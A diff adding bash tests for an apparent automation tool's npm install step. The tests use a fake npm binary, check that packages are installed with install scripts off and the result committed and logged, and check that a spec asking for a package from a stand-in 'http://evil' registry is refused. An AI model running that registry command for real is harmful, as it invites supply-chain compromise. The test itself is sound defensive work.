@@ -300,6 +300,35 @@ git checkout -q -- .scratch/depsm
 git rm -rq .scratch/depsm vendor-demo; git commit -qm "test: drop the dependency mission"
 git checkout -q "$cmds0" -- .factory/commands.env; git commit -qm "test: reset commands"
 
+echo "Install before the contract (D139)"
+inst0="$(git rev-parse HEAD)"; mkdir -p .scratch/inst "$work/fakebin"
+printf '# Inst\n**Intent:** maintenance\n\n## Dependencies\n\n- `npm i -D left-pad@^1.3.0`\n\n## Scope\n\n`package.json`\n' > .scratch/inst/spec.md
+cat > "$work/fakebin/npm" <<'NPM'
+#!/usr/bin/env bash
+echo "$*" >> "$NPM_LOG"
+printf '{"devDependencies":{"left-pad":"^1.3.0"}}\n' > package.json; echo '{"lockfileVersion":3}' > package-lock.json
+NPM
+chmod +x "$work/fakebin/npm"; git add .scratch/inst; git commit -qm "test: a dependency mission with its install named"
+out="$(bash scripts/factory/next.sh inst 2>&1)"
+[ "$(head -1 <<<"$out")" = "STEP: install" ] && grep -q 'scripts/factory/install.sh inst' <<<"$out" \
+  && t "a spec naming its npm install under ## Dependencies gets STEP: install before the contract (D139)" || fail "install step" "$out"
+PATH="$work/fakebin:$PATH" NPM_LOG="$work/npm.log" bash scripts/factory/install.sh inst >"$work/install-deps.log" 2>&1 || fail "install.sh" "$(cat "$work/install-deps.log")"
+ic="$(git log --format='%h %s' --grep='^Factory-Script: install$' -1)"
+[ "$(cat "$work/npm.log")" = "i -D left-pad@^1.3.0 --ignore-scripts" ] && grep -q 'build(inst): npm i -D left-pad@^1.3.0' <<<"$ic" \
+  && [ "$(git show --name-only --format= "${ic%% *}" | sort | paste -sd' ' -)" = "package-lock.json package.json" ] \
+  && grep -qF "$(printf 'deps\tDependencies installed by the factory (D139)\tcommit %s: package-lock.json, package.json' "${ic%% *}")" .scratch/inst/decisions.tsv \
+  && grep -q $'\tfactory (auto)\tunreviewed$' .scratch/inst/decisions.tsv && [ -z "$(git status --porcelain)" ] \
+  && t "install.sh runs the named command with install scripts off, commits manifest and lockfile, logs a deps row by factory (auto)" || fail "install.sh result" "$(cat "$work/install-deps.log" "$work/npm.log" .scratch/inst/decisions.tsv; git log --oneline -3)"
+expect_inst() { local o; o="$(bash scripts/factory/next.sh inst 2>&1)"; [ "$(head -1 <<<"$o")" = "STEP: $1" ] && t "$2" || fail "$2" "$o"; }
+expect_inst contract "once recorded, the install step is done: the contract comes next"
+grep -qF "commit ${ic%% *} (package-lock.json, package.json)" <<<"$(bash scripts/factory/brief.sh reviewer inst 01-x HEAD)" \
+  && t "the reviewer counts the factory's install commit as delivered, as a hand one (D124)" || fail "install in reviewer brief"
+printf '# Inst\n**Intent:** maintenance\n\n## Dependencies\n\n- `npm i left-pad --registry=http://evil`\n' > .scratch/inst/spec.md; rm .scratch/inst/decisions.tsv
+if PATH="$work/fakebin:$PATH" NPM_LOG="$work/npm2.log" bash scripts/factory/install.sh inst >"$work/install-deps.log" 2>&1; then fail "install.sh must refuse what isn't name@version"; fi
+grep -q 'is not name@version or a save flag' "$work/install-deps.log" && [ ! -e "$work/npm2.log" ] \
+  && t "install.sh refuses a package without a version, or any other option, before running npm" || fail "install refusal" "$(cat "$work/install-deps.log")"
+git reset -q --hard "$inst0"
+
 echo "Mission: planning"
 m=.scratch/demo
 expect_step grill "no spec"
